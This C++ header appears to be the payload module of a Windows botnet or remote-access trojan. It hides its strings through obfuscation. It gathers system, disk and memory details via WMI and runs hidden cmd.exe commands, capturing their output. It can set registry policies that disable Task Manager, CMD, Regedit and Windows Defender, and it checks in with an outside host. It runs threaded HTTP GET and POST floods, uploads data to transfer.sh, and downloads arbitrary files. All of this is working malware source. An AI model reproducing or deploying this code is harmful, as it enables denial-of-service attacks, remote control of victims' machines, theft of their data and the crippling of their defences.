#pragma once
#define _WIN32_DCOM
#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <advobf/MetaString.h>
#include <atomic>
#include <atlbase.h>
#include <atlconv.h>
#include <binaryhandling.hpp>
#include <comdef.h>
#include <Common.hpp>
#include <CONFIG.h>
#include <httplib.h>
#include <thread>
#include <URLparse.hpp>
#include <Wbemidl.h>
#include <windows.h>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "Advapi32.lib")

namespace payloads {
    std::atomic<bool> cont = true;
    nk125::random r;
    // Global Headers
}

httplib::Headers h = {
    {OBFUSCATED("User-Agent"), OBFUSCATED("LOLOLOLOL/1.0")}
};

std::string getprop(LPCWSTR prop, VARIANT vtProp, std::wstring buf, HRESULT& hr, IWbemClassObject* pclsObj) {
    using namespace andrivet::ADVobfuscator;
    hr = pclsObj->Get(prop, 0, &vtProp, 0, 0);

    if (FAILED(hr) || vtProp.vt != VT_BSTR) {
        return OBFUSCATED("Empty Property");
    }

    buf = vtProp.bstrVal;
    CW2A bridge(buf.data());
    return std::string{ bridge.m_psz };
}

std::string get_sysinfo() {
    HRESULT hres;
    std::string sysinform;
    std::wstring bridge;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return OBFUSCATED("COM Failed to initialize");

    hres = CoInitializeSecurity(
        NULL,
        -1,                          // COM authentication
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities
        NULL                         // Reserved
    );

    if (FAILED(hres)) return OBFUSCATED("COM Security Initialize Failed");

    IWbemLocator* pLoc = NULL;

    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);

    if (FAILED(hres)) return OBFUSCATED("WMI Locator Initialize Failed");

    IWbemServices* pSvc = NULL;

    hres = pLoc->ConnectServer(
        _bstr_t(OBFUSCATED("ROOT\\CIMV2")), // Object path of WMI namespace
        NULL,                    // User name. NULL = current user
        NULL,                    // User password. NULL = current
        0,                       // Locale. NULL indicates current
        NULL,                    // Security flags.
        0,                       // Authority (for example, Kerberos)
        0,                       // Context object
        &pSvc                    // pointer to IWbemServices proxy
    );

    if (FAILED(hres)) return OBFUSCATED("Failed to connect to WMI CIMV2 namespace");

    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
        NULL,                        // Server principal name
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // client identity
        EOAC_NONE                    // proxy capabilities
    );

    if (FAILED(hres)) return OBFUSCATED("Failed at setting up proxy security levels");

    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->ExecQuery(
        bstr_t(OBFUSCATED("WQL")),
        bstr_t(OBFUSCATED("SELECT * FROM Win32_OperatingSystem")),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator);

    if (FAILED(hres)) return OBFUSCATED("Fault while getting system info");

    IWbemClassObject* pclsObj = NULL;
    ULONG uReturn = 0;

    while (pEnumerator) {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
            &pclsObj, &uReturn);

        if (0 == uReturn) break;

        VARIANT vtProp = { 0 };

        sysinform = std::string{ OBFUSCATED("SystemInfo: ") } +
            OBFUSCATED("\nWindows Ver: ") + getprop(L"Caption", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nCodePage: ") + getprop(L"CodeSet", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nArchitecture: ") + getprop(L"OSArchitecture", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nSystem Dir: ") + getprop(L"SystemDirectory", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nCountry Code: ") + getprop(L"CountryCode", vtProp, bridge, hr, pclsObj) +
            "\n\n";

        VariantClear(&vtProp);
    }

    pEnumerator = NULL;
    hres = pSvc->ExecQuery(
        bstr_t(OBFUSCATED("WQL")),
        bstr_t(OBFUSCATED("SELECT * FROM Win32_LogicalDisk")),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator);

    if (FAILED(hres)) return OBFUSCATED("Fault while getting disks info");

    pclsObj = NULL;
    uReturn = 0;

    while (pEnumerator) {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
            &pclsObj, &uReturn);

        if (0 == uReturn) break;

        VARIANT vtProp = { 0 };

        sysinform += std::string{ OBFUSCATED("Logical Disk: ") } +
            OBFUSCATED("\nID: ") + getprop(L"DeviceID", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nDescription: ") + getprop(L"Description", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nFileSystem: ") + getprop(L"FileSystem", vtProp, bridge, hr, pclsObj);

        try {
            std::string a = getprop(L"Size", vtProp, bridge, hr, pclsObj), b = getprop(L"FreeSpace", vtProp, bridge, hr, pclsObj);
            long long c = std::stoll(b) / (1000 * 1000 * 1000), d = std::stoll(a) / (1000 * 1000 * 1000);

            sysinform += OBFUSCATED("\nSize: ") + std::to_string(d) +
                + OBFUSCATED("GB") +
                OBFUSCATED("\nFree Space: ") + std::to_string(c) + (OBFUSCATED("GB (") + std::to_string(c * 100 / d) + OBFUSCATED("%)"));
        }
        catch (...) {
            sysinform += OBFUSCATED("\nSize: Unknown\nFree Space: Unknown");
        }

        sysinform += "\n\n";

        VariantClear(&vtProp);
    }

    pEnumerator = NULL;
    hres = pSvc->ExecQuery(
        bstr_t(OBFUSCATED("WQL")),
        bstr_t(OBFUSCATED("SELECT * FROM Win32_PhysicalMemory")),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator);

    if (FAILED(hres)) return OBFUSCATED("Fault while getting disks info");

    pclsObj = NULL;
    uReturn = 0;

    while (pEnumerator) {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
            &pclsObj, &uReturn);

        if (0 == uReturn) break;

        VARIANT vtProp = { 0 };

        sysinform += std::string{ OBFUSCATED("RAM Slot: ") } +
            OBFUSCATED("\nLocator: ") + getprop(L"DeviceLocator", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nName: ") + getprop(L"Tag", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nDescription: ") + getprop(L"Description", vtProp, bridge, hr, pclsObj) +
            OBFUSCATED("\nManufacturer: ") + getprop(L"Manufacturer", vtProp, bridge, hr, pclsObj);

        try {
            std::string c = getprop(L"Capacity", vtProp, bridge, hr, pclsObj);

            sysinform += OBFUSCATED("\nSize: ") + std::to_string(std::stoll(c) / (1000 * 1000 * 1000)) +
                "GB";
        }
        catch (...) {
            sysinform += OBFUSCATED("\nSize: Unknown");
        }

        sysinform += "\n\n";

        VariantClear(&vtProp);
    }

    pclsObj->Release();
    pSvc->Release();
    pLoc->Release();
    pEnumerator->Release();
    CoUninitialize();

    return sysinform;
}

std::string exec_cmd(std::string exe) {
#ifdef _DEBUG
    std::cout << "Executing:\n" << exe << "\n";
#endif
    std::string stout;
    std::string cmd = OBFUSCATED("C:\\Windows\\System32\\cmd.exe /c ") + exe;
    CA2W wst(cmd.data());
    HANDLE StdInHandles[2];
    HANDLE StdOutHandles[2];
    HANDLE StdErrHandles[2];

    // 0:  READ
    // 1:  WRITE

    SECURITY_ATTRIBUTES saAttr = { 0 };

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = true;
    saAttr.lpSecurityDescriptor = NULL;

    CreatePipe(&StdInHandles[0], &StdInHandles[1], &saAttr, 4096);
    CreatePipe(&StdOutHandles[0], &StdOutHandles[1], &saAttr, 4096);
    CreatePipe(&StdErrHandles[0], &StdErrHandles[1], &saAttr, 4096);

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));  /* zero out */

    si.dwFlags = STARTF_USESTDHANDLES;
    si.cb = sizeof(si);
    si.hStdInput = StdInHandles[0];  /* read handle */
    si.hStdOutput = StdOutHandles[1];  /* write handle */
    si.hStdError = StdErrHandles[1];  /* write handle */

    /* fix other stuff in si */

    PROCESS_INFORMATION pi = { 0 };
    /* fix stuff in pi */

    bool suc = CreateProcessW(NULL, wst.m_psz, NULL, NULL, true, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!suc) return OBFUSCATED("CreateProcessW Fail GLE: ") + std::to_string(GetLastError());

    CloseHandle(StdOutHandles[1]);
    CloseHandle(StdErrHandles[1]);
    CloseHandle(StdInHandles[0]);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

#define BUFSIZE 4096
    DWORD dwRead;
    std::vector<char> chBuf;
    chBuf.resize(BUFSIZE);

    bool bSuccess = FALSE;
    for (;;) {
        bSuccess = ReadFile(StdOutHandles[0], &chBuf[0], BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;
        std::string s(chBuf.data(), dwRead);
        stout += s;
    }

    dwRead = 0;
    for (;;) {
        bSuccess = ReadFile(StdErrHandles[0], &chBuf[0], BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;
        std::string s(chBuf.data(), dwRead);
        stout += s;
    }

    CloseHandle(StdOutHandles[0]);
    CloseHandle(StdErrHandles[0]);
    CloseHandle(StdInHandles[1]);

    return stout;
}

#if !defined(_DEBUG) && (DEACT_TASKMGR || DEACT_CMD || DEACT_REGEDIT || DEACT_WINDEF)
int writeSysPolicy(std::string key, DWORD value, std::string sk, bool HKLM = false) {
    HKEY hKey;
    std::string type = OBFUSCATED("REG_DWORD");
    HKEY defHK = (HKLM ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER);
    DWORD r, v = value;

    r = RegCreateKeyExA(defHK, sk.c_str(), 0, (LPSTR)type.data(), 0, KEY_ALL_ACCESS, NULL, &hKey, 0);
    if (r != 0) {
        return r;
    }

    r = RegSetValueExA(hKey, key.c_str(), 0, REG_DWORD, (LPBYTE)&v, sizeof(v));
    if (r != 0) {
        return r;
    }

    r = RegCloseKey(hKey);
    if (r != 0) {
        return r;
    }

    return 0;
}
#endif

bool check_internet_conn() {
    httplib::Client c(OBFUSCATED("https://nekesweb.cf"));

    auto r = c.Get(OBFUSCATED("/checkin.html"));

    return (r ? (r->status == 200 ? !sizeof(int) - sizeof(int) : !std::string("").empty()) : 0);

    return 0;
}

httplib::Client ClientFactory(std::string URL, std::string& path_r) {
    using namespace httplib;

    Url uri(URL);

    std::string scheme = uri.scheme(),
        host = uri.host(),
        path = uri.path(),
        port = uri.port(),
        query = uri.query_to_string(uri.query());

    bool scheme_e = scheme.empty(),
        host_e = host.empty(),
        path_e = path.empty(),
        port_e = port.empty();

    if (host_e) {
#ifdef _DEBUG
        std::cout << "Host Empty!!!!!\n";
#endif
        payloads::cont = false;
        return httplib::Client("");
    }

    Client c((scheme_e ? "https" : scheme) + "://" + host + (port_e ? "" : ":" + port));

    c.set_keep_alive(true);
    c.set_follow_location(true);

    path_r = (path_e ? "/" : path) + query;

    return c;
}

void httpget(std::string URL) {
    while (payloads::cont) {
        std::string path_req;

        ClientFactory(URL, path_req).Get(path_req.c_str(), h);
    }
}

void httpost(std::string URL) {
    while (payloads::cont) {
        std::string path_req;
        std::string body;

        for (int i = 0; i < POST_KB; i++) {
            body.append(payloads::r.gen_random(1024));
        }

        ClientFactory(URL, path_req).Post(path_req.c_str(), h, body.c_str(), OBFUSCATED("text/plain"));
    }
}

void init_getflood(std::string URL, int threads) {
    payloads::cont = true;
#ifdef _DEBUG
    std::cout << "HTTP GET Flood initialized!\n";
#endif

    for (int i = 0; i < threads; i++) {

        try {
            std::thread t(httpget, URL);
            t.detach();
        }
        catch (...) {}
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

void init_postflood(std::string URL, int threads) {
    payloads::cont = true;
#ifdef _DEBUG
    std::cout << "HTTP POST Flood initialized!\n";
#endif

    for (int i = 0; i < threads; i++) {

        try {
            std::thread t(httpost, URL);
            t.detach();
        }
        catch (...) {}
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

std::string upload(std::string filename, std::string body) {
    std::string path_req;

    httplib::Client c = ClientFactory(OBFUSCATED("https://transfer.sh/") + filename, path_req);
    auto r = c.Put(path_req.c_str(), body.c_str(), OBFUSCATED("application/octet-stream"));
    if (r) {
        return "URL: " + r->body + "\nDelete URL: " + r->get_header_value(OBFUSCATED("X-Url-Delete")) + "\n";
    }
    else {
        return "";
    }
}

void download(std::string URL, std::string filename) {
    std::string path_req;

    httplib::Client c = ClientFactory(URL, path_req);

    if (c.is_valid()) {
        httplib::Result r = c.Get(path_req.c_str(), h);

        if (r) {
            std::string body = r->body;
            nk125::binary_file_handler b;

            try {
                b.write_file(filename, body);
            }
            catch (...) {
#ifdef _DEBUG
                std::cout << "download(): Write file failed!\n";
#endif
                return;
            }

#ifdef _DEBUG
            std::cout << "Downloaded File!\n";
#endif
        }
#ifdef _DEBUG
        else {
            std::cout << "download(): GET Request Failed\n";
        }
#endif
    }
}
